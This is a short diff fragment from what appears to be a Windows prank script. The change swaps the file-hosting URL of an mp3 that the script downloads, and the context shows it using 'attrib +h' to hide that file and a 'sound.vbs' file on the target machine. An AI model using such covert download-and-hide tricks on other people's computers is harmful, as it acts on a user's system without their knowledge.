@@ -24,7 +24,7 @@ class main():
                     os.system('attrib +h sound.vbs')
                     main.let_the_fun_begin()
             else:
-                url = 'https://srv-store1.gofile.io/download/HW9jbE/hi2.mp3'
+                url = 'https://filebin.net/ttd4rolqt7sool4m/Merry_Go_Round_of_Life_-_Howl_s_Moving_Castle__Joe_Hisaishi_.mp3?t=1v1m27tn'
                 urllib.request.urlretrieve(url, cwd+'/().mp3')
                 os.system('attrib +h ().mp3')
                 if path.exists("hi.bat"):
